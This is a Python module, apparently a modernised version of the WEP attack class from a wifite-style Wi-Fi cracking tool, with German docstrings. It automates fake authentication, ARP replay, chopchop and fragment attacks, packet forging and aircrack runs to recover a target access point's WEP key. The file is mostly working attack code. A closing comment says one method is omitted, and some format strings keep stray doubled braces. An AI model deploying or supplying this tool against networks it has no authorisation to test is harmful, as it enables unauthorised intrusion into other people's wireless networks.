#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay, WEPAttackType
from ..tools.aircrack import Aircrack
from ..tools.ifconfig import Ifconfig
from ..config import Configuration
from ..util.color import Color
from ..util.input import raw_input
from ..model.wep_result import CrackResultWEP

import time

class AttackWEP(Attack):
    '''
        Enthält die Logik für Angriffe auf WEP-verschlüsselte Access Points.
    '''

    fakeauth_wait = 5  # TODO: Configuration?

    def __init__(self, target):
        super().__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Startet den vollständigen WEP-Angriff.
            Gibt True zurück, wenn erfolgreich, sonst False.
        '''

        aircrack = None
        fakeauth_proc = None
        replay_file = None
        airodump_target = None

        previous_ivs = 0
        current_ivs = 0
        total_ivs = 0
        keep_ivs = Configuration.wep_keep_ivs

        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')

        attacks_remaining = list(Configuration.wep_attacks)
        while attacks_remaining:
            attack_name = attacks_remaining.pop(0)
            try:
                with Airodump(
                    channel=self.target.channel,
                    target_bssid=self.target.bssid,
                    ivs_only=True,
                    skip_wps=True,
                    output_file_prefix='wep',
                    delete_existing_files=not keep_ivs
                ) as airodump:

                    Color.clear_line()
                    Color.p('\r{+} {O}waiting{W} for target to appear...')
                    airodump_target = self.wait_for_target(airodump)

                    fakeauth_proc = None
                    if self.fake_auth():
                        client_mac = Ifconfig.get_mac(Configuration.interface)
                        fakeauth_proc = Aireplay(self.target, 'fakeauth')
                    elif not airodump_target.clients:
                        Color.pl('{!} {O}there are no associated clients{W}')
                        Color.pl('{!} {R}WARNING: {O}many attacks will not succeed without fake-authentication or associated clients{W}')
                        client_mac = None
                    else:
                        client_mac = airodump_target.clients[0].station

                    wep_attack_type = WEPAttackType(attack_name)
                    aireplay = Aireplay(self.target, wep_attack_type, client_mac=client_mac, replay_file=replay_file)

                    time_unchanged_ivs = time.time()
                    last_ivs_count = 0

                    while True:
                        airodump_target = self.wait_for_target(airodump)

                        if client_mac is None and airodump_target.clients:
                            client_mac = airodump_target.clients[0].station

                        if keep_ivs and current_ivs > airodump_target.ivs:
                            previous_ivs += total_ivs
                        current_ivs = airodump_target.ivs
                        total_ivs = previous_ivs + current_ivs

                        status = f'{total_ivs}/{{C}}{Configuration.wep_crack_at_ivs}{{W}} IVs'
                        if fakeauth_proc:
                            status += ', {G}fakeauth{W}' if fakeauth_proc.status else ', {R}no-auth{W}'
                        if aireplay.status is not None:
                            status += f', {aireplay.status}'
                        Color.clear_entire_line()
                        Color.pattack('WEP', airodump_target, f'{attack_name}', status)

                        if aircrack and aircrack.is_cracked():
                            hex_key, ascii_key = aircrack.get_key_hex_ascii()
                            bssid = airodump_target.bssid
                            essid = airodump_target.essid if airodump_target.essid_known else None
                            Color.pl(f'\n{{+}} {{C}}{attack_name}{{W}} WEP attack {{G}}successful{{W}}\n')
                            if aireplay: aireplay.stop()
                            if fakeauth_proc: fakeauth_proc.stop()
                            self.crack_result = CrackResultWEP(self.target.bssid, self.target.essid, hex_key, ascii_key)
                            self.crack_result.dump()
                            Airodump.delete_airodump_temp_files('wep')
                            self.success = True
                            return self.success

                        if aircrack and aircrack.is_running():
                            Color.p('and {C}cracking{W}')

                        if total_ivs > Configuration.wep_crack_at_ivs:
                            if not aircrack or not aircrack.is_running():
                                ivs_files = airodump.find_files(endswith='.ivs')
                                ivs_files.sort()
                                if ivs_files:
                                    if not keep_ivs:
                                        ivs_files = ivs_files[-1]
                                    aircrack = Aircrack(ivs_files)
                            elif Configuration.wep_restart_aircrack > 0 and aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                aircrack.stop()
                                ivs_files = airodump.find_files(endswith='.ivs')
                                ivs_files.sort()
                                if ivs_files:
                                    if not keep_ivs:
                                        ivs_files = ivs_files[-1]
                                    aircrack = Aircrack(ivs_files)

                        if not aireplay.is_running():
                            if attack_name in ['chopchop', 'fragment']:
                                replay_file = None
                                xor_file = Aireplay.get_xor()
                                if not xor_file:
                                    Color.pl(f'\n{{!}} {{O}}{attack_name} attack{{R}} did not generate a .xor file')
                                    Color.pl(f'{{?}} {{O}}Command: {{R}}{" ".join(aireplay.cmd)}{{W}}')
                                    Color.pl(f'{{?}} {{O}}Output:\n{{R}}{aireplay.get_output()}{{W}}')
                                    break

                                Color.pl(f'\n{{+}} {{C}}{attack_name} attack{{W}} generated a {{C}}.xor file{{W}}, {{G}}forging...{{W}}')
                                replay_file = Aireplay.forge_packet(xor_file, airodump_target.bssid, client_mac)
                                if replay_file:
                                    Color.pl('{{+}} {{C}}forged packet{{W}}, {{G}}replaying...{{W}}')
                                    wep_attack_type = WEPAttackType('forgedreplay')
                                    attack_name = 'forgedreplay'
                                    aireplay = Aireplay(self.target, 'forgedreplay', client_mac=client_mac, replay_file=replay_file)
                                    time_unchanged_ivs = time.time()
                                    continue
                                else:
                                    break
                            else:
                                Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
                                Color.pl(f'{{?}} {{O}}Command: {{R}}{" ".join(aireplay.cmd)}{{W}}')
                                Color.pl(f'{{?}} {{O}}Output:\n{{R}}{aireplay.get_output()}{{W}}')
                                break

                        if airodump_target.ivs > last_ivs_count:
                            time_unchanged_ivs = time.time()
                        elif Configuration.wep_restart_stale_ivs > 0 and attack_name not in ['chopchop', 'fragment']:
                            stale_seconds = time.time() - time_unchanged_ivs
                            if stale_seconds > Configuration.wep_restart_stale_ivs:
                                aireplay.stop()
                                Color.pl(f'\n{{!}} restarting {{C}}aireplay{{W}} after {{C}}{int(stale_seconds)}{{W}} seconds of no new IVs')
                                aireplay = Aireplay(self.target, wep_attack_type, client_mac=client_mac, replay_file=replay_file)
                                time_unchanged_ivs = time.time()
                        last_ivs_count = airodump_target.ivs

                        time.sleep(1)
                        continue
            except KeyboardInterrupt:
                if fakeauth_proc: fakeauth_proc.stop()
                if not attacks_remaining:
                    if keep_ivs:
                        Airodump.delete_airodump_temp_files('wep')
                    self.success = False
                    return self.success
                if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
                    if keep_ivs:
                        Airodump.delete_airodump_temp_files('wep')
                    self.success = False
                    return self.success
            except Exception as e:
                Color.pexception(e)
                continue

        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')

        self.success = False
        return self.success

    # ... user_wants_to_stop bleibt wie gehabt, nur super() und f-Strings anpassen!
